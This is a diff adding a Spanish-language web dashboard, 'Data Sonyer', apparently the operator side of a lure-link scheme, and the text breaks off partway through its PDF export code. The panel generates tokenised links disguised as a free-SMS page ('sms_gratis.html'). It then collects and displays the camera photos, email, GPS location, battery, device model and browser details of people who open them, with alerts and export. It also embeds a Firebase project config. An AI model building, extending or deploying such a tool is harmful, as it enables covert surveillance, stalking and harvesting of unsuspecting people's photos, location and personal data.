@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+<title>Data Sonyer</title>
+<meta name="theme-color" content="#06081a"/>
+<meta name="mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
+<meta name="apple-mobile-web-app-title" content="Data Sonyer"/>
+<link rel="manifest" href="./manifest.json"/>
+<link rel="apple-touch-icon" href="./icon-192.png"/>
+
+<style>
+:root{
+  --bg:#06081a;--card:#11162d;--line:rgba(255,255,255,.11);--text:#f8f9ff;
+  --muted:#aeb6ca;--blue:#2f62ff;--purple:#7b3cff;--green:#10b981;--red:#ef4444;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{
+  margin:0;min-height:100%;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;color:var(--text);
+  background:radial-gradient(circle at top left,rgba(123,60,255,.34),transparent 34%),
+  radial-gradient(circle at top right,rgba(47,98,255,.20),transparent 35%),
+  linear-gradient(rgba(255,255,255,.026) 1px,transparent 1px),
+  linear-gradient(90deg,rgba(255,255,255,.026) 1px,transparent 1px),
+  var(--bg);background-size:100% 100%,100% 100%,68px 68px,68px 68px,auto;
+}
+.app{max-width:700px;margin:0 auto;padding-bottom:24px}
+.top{position:sticky;top:0;z-index:30;padding:8px 10px;display:flex;align-items:center;gap:10px;background:rgba(6,8,26,.91);backdrop-filter:blur(16px);border-bottom:1px solid var(--line)}
+.logo{width:38px;height:38px;border-radius:14px;background:linear-gradient(145deg,#7b3cff,#2f62ff);display:grid;place-items:center;font-weight:1000}
+.title{min-width:0;flex:1}.title b{display:block;font-size:17px}.title span{display:block;font-size:12px;color:var(--muted);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.live{padding:7px 10px;border-radius:999px;background:rgba(16,185,129,.11);border:1px solid rgba(16,185,129,.28);font-size:12px;font-weight:900;color:#baf7dc}
+.hero{padding:11px 12px 2px;text-align:center}.hero h1{font-size:22px;margin:0 0 7px}.hero h1 span{color:#7bd3ff}.hero p{margin:0;color:var(--muted);font-size:13px;line-height:1.35}
+.card{margin:8px 10px;padding:10px;border:1px solid var(--line);border-radius:18px;background:linear-gradient(145deg,rgba(255,255,255,.07),rgba(255,255,255,.035));box-shadow:0 16px 40px rgba(0,0,0,.28)}
+input{width:100%;height:38px;border:1px solid var(--line);border-radius:13px;background:#070c1f;color:white;outline:0;padding:0 11px;font-size:12.5px}
+label{display:block;font-size:11.5px;color:#cdd3e9;font-weight:900;margin:0 0 5px}
+.field{margin-bottom:9px}.row{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+button,a.btn{min-height:38px;border:1px solid rgba(255,255,255,.12);border-radius:13px;padding:10px 11px;background:rgba(255,255,255,.08);color:white;font-weight:950;font-size:12.5px;text-decoration:none;display:grid;place-items:center;cursor:pointer;text-align:center}
+.primary{background:linear-gradient(135deg,var(--blue),var(--purple));border:0}.green{background:linear-gradient(135deg,#0f8b69,var(--green));border:0}.red{background:rgba(239,68,68,.14);border-color:rgba(239,68,68,.28);color:#ffd9d9}
+.hidden{display:none!important}
+.userRow{display:flex;align-items:center;gap:9px}.av{width:38px;height:38px;border-radius:13px;background:linear-gradient(145deg,#7b3cff,#2f62ff);display:grid;place-items:center;font-weight:1000}.userInfo{flex:1;min-width:0}.userInfo b{display:block;font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.userInfo span{display:block;color:var(--muted);font-size:10.8px;margin-top:3px;word-break:break-all}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin:8px 10px}.stat{padding:9px;border-radius:16px;border:1px solid var(--line);background:rgba(255,255,255,.045);text-align:center}.stat b{font-size:18px;line-height:1}.stat span{display:block;margin-top:4px;color:var(--muted);font-size:10.8px;font-weight:850}
+.tools{padding:0 10px 7px;display:grid;gap:7px}
+.list{display:grid;gap:8px;padding:4px 10px 18px}
+.photo{display:grid;grid-template-columns:86px 1fr;gap:9px;padding:8px;border:1px solid var(--line);border-radius:18px;background:linear-gradient(145deg,#11162d,#0b1025);box-shadow:0 13px 28px rgba(0,0,0,.22)}
+.thumb{width:86px;height:108px;border-radius:14px;overflow:hidden;background:rgba(255,255,255,.06);display:grid;place-items:center;color:#ffd8d8;text-align:center;font-size:11px;font-weight:900}
+.thumb img{width:100%;height:100%;object-fit:cover;display:block}
+.meta{min-width:0;padding:2px 0}.meta b{display:block;font-size:13px;margin-bottom:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.meta span{display:block;color:var(--muted);font-size:10.7px;line-height:1.35;margin:2px 0;word-break:break-word}
+.deviceBox{margin-top:7px;padding:7px;border:1px solid rgba(255,255,255,.09);border-radius:12px;background:rgba(255,255,255,.045)}
+.deviceBox strong{display:block;font-size:11px;margin-bottom:4px;color:#e8ebff}.deviceBox em{font-style:normal;display:block;color:#b8c0d5;font-size:10.8px;line-height:1.35;margin-top:2px;word-break:break-word}
+.actions{display:grid;grid-template-columns:1fr 1fr;gap:5px;margin-top:7px}.actions a,.actions button{min-height:31px;border-radius:10px;font-size:10.8px;padding:5px}
+.empty{display:none;margin:12px;padding:18px;border:1px solid var(--line);border-radius:17px;background:rgba(255,255,255,.045);text-align:center;color:var(--muted);font-size:13px;line-height:1.4}
+.toast{position:fixed;left:12px;right:12px;bottom:16px;z-index:80;display:none;max-width:520px;margin:0 auto;padding:12px 14px;border-radius:14px;background:#0c1128;color:white;border:1px solid var(--line);box-shadow:0 18px 44px rgba(0,0,0,.34);font-size:12.5px}.toast.show{display:block}
+.viewer{position:fixed;inset:0;z-index:90;background:rgba(0,0,0,.72);display:none;align-items:center;justify-content:center;padding:15px;backdrop-filter:blur(8px)}.viewer.show{display:flex}.viewBox{width:min(540px,100%);max-height:92vh;overflow:auto;background:#0d1127;border:1px solid var(--line);border-radius:20px;padding:12px}.viewBox img{width:100%;border-radius:15px;display:block}.close{float:right;width:36px;min-height:36px;margin-bottom:8px;border-radius:12px}
+
+
+
+.installBanner{position:fixed;left:12px;right:12px;bottom:14px;z-index:110;max-width:520px;margin:0 auto;display:none;padding:12px;border-radius:18px;background:linear-gradient(145deg,rgba(15,22,52,.98),rgba(9,14,35,.98));border:1px solid rgba(255,255,255,.12);box-shadow:0 22px 54px rgba(0,0,0,.46);backdrop-filter:blur(14px)}
+.installBanner.show{display:block;animation:installIn .22s ease-out}
+@keyframes installIn{from{transform:translateY(18px);opacity:0}to{transform:translateY(0);opacity:1}}
+.installHead{display:flex;gap:10px;align-items:center}
+.installIcon{width:42px;height:42px;border-radius:14px;background:linear-gradient(145deg,#7b3cff,#2f62ff);display:grid;place-items:center;font-weight:1000;color:#fff}
+.installText{min-width:0;flex:1}
+.installText b{display:block;font-size:14px;color:#fff}
+.installText span{display:block;font-size:11.5px;color:#aeb6ca;line-height:1.35;margin-top:2px}
+.installActions{display:grid;grid-template-columns:1fr auto;gap:8px;margin-top:10px}
+.installActions button{min-height:36px;border-radius:12px;font-size:12px}
+.installClose{width:42px;background:rgba(255,255,255,.06)}
+
+.bellWrap{position:relative}
+.bellBtn{width:40px;min-height:40px;border-radius:14px;padding:0;background:rgba(255,255,255,.055);border:1px solid rgba(255,255,255,.11);font-size:18px;display:grid;place-items:center}
+.bellBtn.active{background:linear-gradient(135deg,rgba(47,98,255,.35),rgba(123,60,255,.35));border-color:rgba(123,60,255,.45)}
+.bellBadge{position:absolute;right:-4px;top:-5px;min-width:18px;height:18px;padding:0 5px;border-radius:999px;background:#ef4444;color:#fff;font-size:10px;font-weight:1000;display:none;align-items:center;justify-content:center;border:2px solid #06081a}
+.bellBadge.show{display:flex}
+.bellPanel{position:fixed;right:12px;top:72px;z-index:70;width:min(310px,calc(100% - 24px));padding:12px;border-radius:18px;background:linear-gradient(180deg,rgba(13,19,45,.98),rgba(9,13,32,.98));border:1px solid rgba(255,255,255,.12);box-shadow:0 22px 55px rgba(0,0,0,.42);display:none}
+.bellPanel.show{display:block}
+.bellPanel b{display:block;font-size:14px;margin-bottom:5px;color:#fff}
+.bellPanel p{margin:0;color:#b9c2d8;font-size:12px;line-height:1.35}
+.bellStats{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-top:10px}
+.bellMini{padding:9px;border-radius:13px;background:rgba(255,255,255,.055);border:1px solid rgba(255,255,255,.08);text-align:center}
+.bellMini strong{display:block;font-size:18px;color:#fff}
+.bellMini span{display:block;margin-top:2px;font-size:10.5px;color:#aeb6ca;font-weight:850}
+.bellPanel .row{margin-top:10px}
+
+.dialogOverlay{position:fixed;inset:0;z-index:120;display:none;align-items:center;justify-content:center;padding:14px;background:rgba(3,6,18,.72);backdrop-filter:blur(10px)}
+.dialogOverlay.show{display:flex}
+.dialogCard{width:min(350px,calc(100% - 24px));padding:14px;border-radius:20px;background:linear-gradient(180deg,rgba(13,19,45,.98),rgba(10,15,38,.98));border:1px solid rgba(255,255,255,.11);box-shadow:0 20px 54px rgba(0,0,0,.44)}
+.dialogIcon{width:42px;height:42px;border-radius:15px;display:grid;place-items:center;font-size:19px;font-weight:900;margin-bottom:10px;background:linear-gradient(135deg,rgba(47,98,255,.26),rgba(123,60,255,.28));border:1px solid rgba(123,60,255,.28)}
+.dialogCard.danger .dialogIcon{background:linear-gradient(135deg,rgba(239,68,68,.24),rgba(123,60,255,.22));border-color:rgba(239,68,68,.28)}
+.dialogCard.warning .dialogIcon{background:linear-gradient(135deg,rgba(245,158,11,.22),rgba(123,60,255,.22));border-color:rgba(245,158,11,.28)}
+.dialogTitle{font-size:18px;font-weight:1000;line-height:1.15;margin:0 0 7px;color:#fff}
+.dialogText{font-size:12.8px;line-height:1.42;color:#c8d0e7;margin:0}
+.dialogText strong{color:#fff}
+.dialogButtons{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:14px}
+.dialogButtons.single{grid-template-columns:1fr}
+.dialogButtons button{min-height:38px;border-radius:13px;font-size:12.4px}
+.dialogNote{margin-top:8px;font-size:11.4px;line-height:1.25;color:#90f2bf}
+
+@media(max-width:430px){.photo{grid-template-columns:82px 1fr}.thumb{width:82px;height:104px}.stats{gap:6px}.hero h1{font-size:21px}.card{border-radius:16px}.photo{border-radius:16px}}
+</style>
+</head>
+<body>
+<div class="app">
+  <header class="top"><div class="logo">PF</div><div class="title"><b>Panel Fotos</b><span id="userLabel">Dueño sonyer</span></div><div class="bellWrap"><button class="bellBtn" id="bellBtn" type="button" title="Campanita">🔔</button><span class="bellBadge" id="bellBadge">0</span></div><div class="live" id="live">OFF</div></header>
+  <section class="hero"><h1>Fotos <span>en vivo</span></h1><p>Las fotos nuevas guardan ubicación ligera si el usuario acepta el permiso.</p></section>
+
+  <section class="card" id="authCard">
+    <div class="field"><label>Correo</label><input id="email" type="email" placeholder="correo@gmail.com"></div>
+    <div class="field"><label>Contraseña</label><input id="password" type="password" placeholder="contraseña"></div>
+    <div class="row"><button class="primary" id="loginBtn">Entrar</button><button class="green" id="registerBtn">Crear cuenta</button></div>
+  </section>
+
+  <section class="card hidden" id="adminCard">
+    <div class="userRow"><div class="av" id="avatar">S</div><div class="userInfo"><b id="emailShow">Usuario</b><span id="uidShow">UID</span></div><button class="red" id="logoutBtn">Salir</button></div>
+    <div style="height:7px"></div>
+    <div style="font-size:11px;color:#baf7dc;font-weight:900;margin:0 0 8px 47px;">Dueño sonyer</div>
+    <div class="field"><label>Nombre del link</label><input id="linkFileName" value="sms_gratis.html"></div>
+    <div class="field"><label>Link del app</label><input id="appLink" readonly></div>
+    <div class="row"><button class="primary" id="generateBtn">Generar link</button><button class="green" id="copyBtn">Copiar link</button></div>
+    <div style="height:7px"></div>
+    <button class="red" id="resetDeviceBtn" type="button">Resetear celular autorizado</button>
+  </section>
+
+  <section class="stats hidden" id="stats"><div class="stat"><b id="totalCount">0</b><span>Total</span></div><div class="stat"><b id="todayCount">0</b><span>Hoy</span></div><div class="stat"><b id="lastTime">--</b><span>Última</span></div></section>
+  <section class="tools hidden" id="tools"><input id="search" placeholder="Buscar acción, número o fecha..."><div class="row"><button class="primary" id="reloadBtn">Actualizar</button><button class="green" id="exportBtn">Exportar CSV</button></div><div class="row"><button class="green" id="shareAllBtn">Compartir datos</button><button class="red" id="deleteAllBtn">Borrar todo</button></div></section>
+  <div class="empty" id="empty">No hay fotos todavía.</div>
+  <main class="list" id="list"></main>
+</div>
+<div class="viewer" id="viewer"><div class="viewBox"><button class="close" id="closeViewer">×</button><div id="viewerContent"></div></div></div>
+
+
+<div class="installBanner" id="installBanner">
+  <div class="installHead">
+    <div class="installIcon">DS</div>
+    <div class="installText">
+      <b>Instalar Data Sonyer</b>
+      <span id="installText">Puedes guardar este panel como app web en tu celular.</span>
+    </div>
+  </div>
+  <div class="installActions">
+    <button class="primary" id="installAppBtn" type="button">Instalar app</button>
+    <button class="installClose" id="installCloseBtn" type="button">×</button>
+  </div>
+</div>
+
+<div class="bellPanel" id="bellPanel">
+  <b>Campanita de datos</b>
+  <p id="bellStatus">La campanita ya viene activa. Al llegar una foto nueva sonará y aumentará el contador.</p>
+  <div class="bellStats">
+    <div class="bellMini"><strong id="bellNewCount">0</strong><span>Nuevos</span></div>
+    <div class="bellMini"><strong id="bellTotalCount">0</strong><span>Total</span></div>
+  </div>
+  <div class="row">
+    <button class="primary" id="enableSoundBtn" type="button">Activar sonido</button>
+    <button id="clearBellBtn" type="button">Limpiar</button>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+<div class="dialogOverlay" id="dialogOverlay">
+  <div class="dialogCard" id="dialogCard">
+    <div class="dialogIcon" id="dialogIcon">i</div>
+    <h3 class="dialogTitle" id="dialogTitle">Aviso</h3>
+    <p class="dialogText" id="dialogText"></p>
+    <div class="dialogNote" id="dialogNote" style="display:none"></div>
+    <div class="dialogButtons" id="dialogButtons">
+      <button id="dialogCancelBtn">Cancelar</button>
+      <button class="primary" id="dialogOkBtn">Aceptar</button>
+    </div>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
+import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-auth.js";
+import { getFirestore, collection, query, onSnapshot, doc, getDoc, setDoc, deleteDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAgHKSWXEhkaqmlMCJUyPyN82JXqckYDHY",
+  authDomain: "fotos-6506e.firebaseapp.com",
+  projectId: "fotos-6506e",
+  storageBucket: "fotos-6506e.firebasestorage.app",
+  messagingSenderId: "203454756779",
+  appId: "1:203454756779:web:c1f759c14f642ac8d0c4ee",
+  measurementId: "G-CDPKF5FGYP"
+};
+
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+const $ = id => document.getElementById(id);
+let photos = [], token = "", unsub = null, toastTimer = null;
+
+let deferredInstallPrompt = null;
+function isStandaloneMode(){
+  return window.matchMedia("(display-mode: standalone)").matches || window.navigator.standalone === true;
+}
+function isiOSDevice(){
+  return /iphone|ipad|ipod/i.test(navigator.userAgent) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+}
+function updateInstallText(){
+  if(isStandaloneMode()){
+    $("installText").textContent = "La app ya está instalada en este celular.";
+    $("installAppBtn").textContent = "Instalada";
+    return;
+  }
+  if(isiOSDevice()){
+    $("installText").textContent = "En iPhone toca Compartir y luego “Agregar a pantalla de inicio”.";
+    $("installAppBtn").textContent = "Ver cómo instalar";
+  }else if(deferredInstallPrompt){
+    $("installText").textContent = "Toca instalar para abrir este panel como app web en Android o Chrome.";
+    $("installAppBtn").textContent = "Instalar app";
+  }else{
+    $("installText").textContent = "En Chrome toca menú ⋮ y luego “Agregar a pantalla de inicio”.";
+    $("installAppBtn").textContent = "Ver ayuda";
+  }
+}
+function showInstallBanner(force=false){
+  if(isStandaloneMode() || (!force && localStorage.getItem("pwa_install_closed")==="1")) return;
+  updateInstallText();
+  $("installBanner").classList.add("show");
+}
+function hideInstallBanner(){
+  $("installBanner").classList.remove("show");
+  localStorage.setItem("pwa_install_closed","1");
+}
+async function installPWA(){
+  updateInstallText();
+  if(isStandaloneMode()){
+    hideInstallBanner();
+    return;
+  }
+  if(deferredInstallPrompt){
+    deferredInstallPrompt.prompt();
+    await deferredInstallPrompt.userChoice.catch(()=>{});
+    deferredInstallPrompt = null;
+    hideInstallBanner();
+    return;
+  }
+  if(isiOSDevice()){
+    await showDialog({
+      title:"Instalar en iPhone",
+      message:"1. Toca el botón <strong>Compartir</strong> de Safari o Chrome.<br>2. Elige <strong>Agregar a pantalla de inicio</strong>.<br>3. Toca <strong>Agregar</strong>.",
+      confirmText:"Entendido",
+      showCancel:false,
+      tone:"info"
+    });
+  }else{
+    await showDialog({
+      title:"Instalar en Android",
+      message:"En Chrome toca el menú <strong>⋮</strong> y elige <strong>Instalar app</strong> o <strong>Agregar a pantalla principal</strong>.",
+      confirmText:"Entendido",
+      showCancel:false,
+      tone:"info"
+    });
+  }
+}
+window.addEventListener("beforeinstallprompt",(e)=>{
+  e.preventDefault();
+  deferredInstallPrompt = e;
+  setTimeout(()=>showInstallBanner(true), 900);
+});
+window.addEventListener("appinstalled",()=>{
+  deferredInstallPrompt = null;
+  hideInstallBanner();
+  showToast("App instalada.");
+});
+window.addEventListener("load",()=>{
+  if("serviceWorker" in navigator){
+    navigator.serviceWorker.register("./sw.js").catch(console.error);
+  }
+  setTimeout(()=>showInstallBanner(false), 1400);
+});
+
+let bellLoaded = false, knownPhotoIds = new Set(), newBellCount = 0, soundEnabled = true, audioCtx = null;
+
+function esc(t){return String(t ?? "").replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[m]));}
+function showToast(msg,type="info"){clearTimeout(toastTimer);$("toast").textContent=msg;$("toast").className="toast show";$("toast").style.borderColor=type==="error"?"rgba(239,68,68,.35)":"rgba(255,255,255,.11)";toastTimer=setTimeout(()=>$("toast").className="toast",2800);}
+let dialogResolver = null;
+function closeDialog(result){
+  $("dialogOverlay").classList.remove("show");
+  if(dialogResolver){ const r = dialogResolver; dialogResolver = null; r(result); }
+}
+function showDialog({title="Aviso", message="", confirmText="Aceptar", cancelText="Cancelar", tone="info", showCancel=true, note=""}={}){
+  return new Promise(resolve=>{
+    dialogResolver = resolve;
+    const card = $("dialogCard");
+    card.className = `dialogCard ${tone}`.trim();
+    $("dialogTitle").textContent = title;
+    $("dialogText").innerHTML = message;
+    $("dialogOkBtn").textContent = confirmText;
+    $("dialogCancelBtn").textContent = cancelText;
+    $("dialogCancelBtn").style.display = showCancel ? "grid" : "none";
+    $("dialogButtons").classList.toggle("single", !showCancel);
+    $("dialogNote").textContent = note || "";
+    $("dialogNote").style.display = note ? "block" : "none";
+    $("dialogIcon").textContent = tone === "danger" ? "!" : (tone === "warning" ? "↺" : "i");
+    $("dialogOverlay").classList.add("show");
+  });
+}
+
+
+
+function unlockBellSound(){
+  if(!soundEnabled) return;
+  try{
+    audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
+    if(audioCtx.state === "suspended") audioCtx.resume();
+  }catch(e){}
+}
+window.addEventListener("click", unlockBellSound, {passive:true});
+window.addEventListener("touchstart", unlockBellSound, {passive:true});
+
+function updateBell(){
+  $("bellBadge").textContent = newBellCount > 99 ? "99+" : String(newBellCount);
+  $("bellBadge").classList.toggle("show", newBellCount > 0);
+  $("bellNewCount").textContent = newBellCount;
+  $("bellTotalCount").textContent = photos.length;
+  $("bellBtn").classList.toggle("active", soundEnabled);
+  $("enableSoundBtn").textContent = soundEnabled ? "Probar sonido" : "Activar sonido";
+  $("bellStatus").textContent = soundEnabled
+    ? "Sonido activo. La campanita sonará cuando lleguen fotos o datos nuevos."
+    : "La campanita ya viene activa. Al llegar una foto nueva sonará y aumentará el contador.";
+}
+async function enableBellSound(){
+  try{
+    audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
+    if(audioCtx.state === "suspended") await audioCtx.resume();
+    soundEnabled = true;
+    localStorage.setItem("panel_bell_sound","1");
+    updateBell();
+    playBellSound(true);
+    showToast("Campanita activada.");
+  }catch(e){
+    console.error(e);
+    showToast("No se pudo activar el sonido.", "error");
+  }
+}
+function playBellSound(test=false){
+  if(!soundEnabled) return;
+  try{
+    audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
+    const now = audioCtx.currentTime;
+    const makeTone = (freq, start, dur)=>{
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = "sine";
+      osc.frequency.setValueAtTime(freq, now + start);
+      gain.gain.setValueAtTime(0.0001, now + start);
+      gain.gain.exponentialRampToValueAtTime(0.12, now + start + 0.015);
+      gain.gain.exponentialRampToValueAtTime(0.0001, now + start + dur);
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start(now + start);
+      osc.stop(now + start + dur + 0.03);
+    };
+    makeTone(test ? 740 : 880, 0, .16);
+    makeTone(test ? 980 : 1175, .18, .18);
+  }catch(e){ console.error(e); }
+}
+function notifyNewData(count){
+  if(count <= 0) return;
+  newBellCount += count;
+  updateBell();
+  playBellSound();
+  showToast(count === 1 ? "Llegó una foto nueva." : `Llegaron ${count} datos nuevos.`);
+}
+function toggleBellPanel(){
+  $("bellPanel").classList.toggle("show");
+  updateBell();
+}
+function clearBellCount(){
+  newBellCount = 0;
+  updateBell();
+  $("bellPanel").classList.remove("show");
+}
+
+function fmt(v,short=false){if(!v)return"Sin fecha";const d=v.toDate?v.toDate():new Date(v);if(isNaN(d))return String(v);return d.toLocaleString("es-PE",short?{hour:"2-digit",minute:"2-digit"}:{year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"});}
+function dt(p){const v=p.fecha||p.createdAtLocal;const d=v?.toDate?v.toDate():new Date(v||0);return isNaN(d)?new Date(0):d;}
+function makeToken(){return crypto?.randomUUID ? crypto.randomUUID().replaceAll("-","") : "tok_"+Date.now().toString(36)+Math.random().toString(36).slice(2);}
+function cleanFileName(name){let v=String(name||"sms_gratis.html").trim().replace(/[\\/:*?"<>|]/g,"").replace(/\s+/g,"_");if(!v.toLowerCase().endsWith(".html"))v+=".html";return v||"sms_gratis.html";}
+function makeAppLink(t){const u=new URL(cleanFileName($("linkFileName").value),location.href);u.searchParams.set("token",t);return u.href;}
+function imgUrl(p){return (p.url||p.secure_url||p.imageUrl||p.fotoUrl||"").trim();}
+function deviceHtml(p){
+  const d=p.deviceInfo||{};
+  const loc=d.location||{};
+  const battery=d.batteryPercent||p.bateria||(typeof d.batteryLevel==="number"?`${d.batteryLevel}%`:"No guardado");
+  const charging=d.chargingText||p.cargando||(d.charging===true?"Sí":(d.charging===false?"No":"No guardado"));
+  const conn=d.connectionType||p.conexion||"No guardado";
+  const screenSize=d.screen||p.pantalla||"No guardado";
+  const viewport=d.viewport||p.vista||"No guardado";
+  const lang=d.language||p.idioma||"No guardado";
+  const zone=d.timezone||p.zonaHoraria||"No guardado";
+  const system=d.os||p.sistema||d.platform||"No guardado";
+  const browser=d.browser||p.navegador||"No guardado";
+  const model=d.model||p.modelo||"No permitido por navegador";
+  const platformVersion=d.platformVersion||p.versionSistema||"";
+  const lat = loc.latitude ?? p.latitud ?? null;
+  const lng = loc.longitude ?? p.longitud ?? null;
+  const acc = loc.accuracy ?? p.precision ?? "";
+  const map = loc.mapsUrl || p.mapsUrl || "";
+  const locationLine = (lat !== null && lng !== null)
+    ? `📍 Ubicación: ${esc(lat)}, ${esc(lng)} · ±${esc(acc)}m`
+    : `📍 Ubicación: ${esc(loc.status || p.ubicacionEstado || "No guardado")}`;
+
+  return `<div class="deviceBox"><strong>Datos del dispositivo</strong>
+    <em>📱 Modelo: ${esc(model)}</em>
+    <em>🔋 Batería: ${esc(battery)} · Cargando: ${esc(charging)}</em>
+    <em>🖥 Pantalla: ${esc(screenSize)} · Vista: ${esc(viewport)}</em>
+    <em>🌐 Conexión: ${esc(conn)} · Online: ${d.online===false?"No":"Sí"}</em>
+    <em>${locationLine}</em>
+    ${map ? `<em><a style="color:#9ed7ff" href="${esc(map)}" target="_blank">Abrir en Maps</a></em>` : ""}
+    <em>🗣 Idioma: ${esc(lang)} · Zona: ${esc(zone)}</em>
+    <em>⚙️ Sistema: ${esc(system)} ${platformVersion ? "· v " + esc(platformVersion) : ""}</em>
+    <em>🧭 Navegador: ${esc(browser)}</em>
+  </div>`;
+}
+
+function personEmail(p){return p.email||p.correo||p.userEmail||p.ownerEmail||p.deviceInfo?.email||auth.currentUser?.email||"No guardado";}
+function getDeviceData(p){
+  const d=p.deviceInfo||{}, loc=d.location||{};
+  const battery=d.batteryPercent||p.bateria||"No guardado";
+  const charging=d.chargingText||p.cargando||"No guardado";
+  const screenSize=d.screen||p.pantalla||"No guardado";
+  const viewport=d.viewport||p.vista||"No guardado";
+  const conn=d.connectionType||p.conexion||"No guardado";
+  const lang=d.language||p.idioma||"No guardado";
+  const zone=d.timezone||p.zonaHoraria||"No guardado";
+  const system=d.os||p.sistema||d.platform||"No guardado";
+  const browser=d.browser||p.navegador||"No guardado";
+  const model=d.model||p.modelo||"No permitido por navegador";
+  const version=d.platformVersion||p.versionSistema||"";
+  const lat = loc.latitude ?? p.latitud ?? null;
+  const lng = loc.longitude ?? p.longitud ?? null;
+  const acc = loc.accuracy ?? p.precision ?? "";
+  const map = loc.mapsUrl || p.mapsUrl || "";
+  return {
+    correo: personEmail(p),
+    model, battery, charging, screenSize, viewport, conn,
+    online: d.online===false?"No":"Sí",
+    lat, lng, acc, map, lang, zone, system, version, browser,
+    fecha: fmt(p.fecha||p.createdAtLocal),
+    accion: p.accion||"Sin acción",
+    item: p.item||"Sin item"
+  };
+}
+function buildText(p){
+  const x = getDeviceData(p);
+  const locationLine = (x.lat !== null && x.lng !== null)
+    ? `📍 Ubicación: ${x.lat}, ${x.lng} · ±${x.acc}m`
+    : `📍 Ubicación: No guardado`;
+  return `Correo: ${x.correo}
+📱 Modelo: ${x.model}
+🔋 Batería: ${x.battery} · Cargando: ${x.charging}
+🖥 Pantalla: ${x.screenSize} · Vista: ${x.viewport}
+🌐 Conexión: ${x.conn} · Online: ${x.online}
+${locationLine}
+${x.map ? `Abrir en Maps: ${x.map}\n` : ''}🗣 Idioma: ${x.lang} · Zona: ${x.zone}
+⚙️ Sistema: ${x.system}${x.version ? ' · v ' + x.version : ''}
+🧭 Navegador: ${x.browser}`;
+}
+async function shareText(text){
+  try{ if(navigator.share) await navigator.share({text}); else {await navigator.clipboard.writeText(text); showToast("Datos copiados.");} }
+  catch(e){ if(e.name!=="AbortError") showToast("No se pudo compartir.","error"); }
+}
+function detailsHtml(p){return `<div class="deviceBox"><strong>Correo y datos</strong><em>✉️ Correo: ${esc(personEmail(p))}</em>${deviceHtml(p).replace('<div class="deviceBox"><strong>Datos del dispositivo</strong>','<div><strong>Datos del dispositivo</strong>').replace(/<\/div>$/,'</div>')}</div>`;}
+async function loadImageAsDataUrl(url){
+  const res = await fetch(url);
+  if(!res.ok) throw new Error('no-image');
+  const blob = await res.blob();
+  return await new Promise((resolve,reject)=>{
+    const fr = new FileReader();
+    fr.onload = ()=>resolve(fr.result);
+    fr.onerror = reject;
+    fr.readAsDataURL(blob);
+  });
+}
+async function downloadPdf(p){
+  try{
+    if(!window.jspdf || !window.jspdf.jsPDF){ showToast('No cargó el PDF.', 'error'); return; }
+    const { jsPDF } = window.jspdf;
+    const pdf = new jsPDF({orientation:'portrait', unit:'pt', format:'a4'});
+    const pageW = pdf.internal.pageSize.getWidth();
+    const pageH = pdf.internal.pageSize.getHeight();
+    const margin = 28;
+    const cardX = margin;
+    const cardY = 70;
+    const cardW = pageW - margin*2;
+    pdf.setFillColor(8, 12, 32);
+    pdf.rect(0, 0, pageW, pageH, 'F');
+    pdf.setFillColor(18, 26, 54);
+    pdf.roundedRect(cardX, cardY, cardW, pageH-cardY-margin, 18, 18, 'F');
+    pdf.setFillColor(57, 92, 255);
+    pdf.roundedRect(cardX, cardY, cardW, 68, 18, 18, 'F');
+    pdf.setTextColor(255,255,255);
+    pdf.setFont('helvetica','bold');
+    pdf.setFontSize(20);
+    pdf.text('Data Sonyer', cardX + 20, cardY + 28);
+    pdf.setFontSize(11);
+    pdf.setFont('helvetica','normal');
+    pdf.text('Foto y datos del dispositivo', cardX + 20, cardY + 48);
+
+    const x = getDeviceData(p);
+    let cursorY = cardY + 90;
+    const imgAreaX = cardX + 18;
+    const imgAreaY = cursorY;
+    const imgAreaW = 145;
+    const imgAreaH = 185;
+    pdf.setFillColor(12,17,40);
+    pdf.roundedRect(imgAreaX, imgAreaY, imgAreaW, imgAreaH, 14, 14, 'F');
+    const url = imgUrl(p);
+    if(url){
+      try{
+        const dataUrl = await loadImageAsDataUrl(url);
+        const imgType = String(dataUrl).startsWith('data:image/png') ? 'PNG' : 'JPEG';
+        pdf.addImage(dataUrl, imgType, imgAreaX + 6, imgAreaY + 6, imgAreaW - 12, imgAreaH - 12, undefined, 'FAST');
+      }catch(err){
+        pdf.setTextColor(190,196,220);
+        pdf.setFontSize(12);
+        pdf.text('No se pudo cargar la foto', imgAreaX + 16, imgAreaY + 96);
+      }
+    } else {
+      pdf.setTextColor(190,196,220);
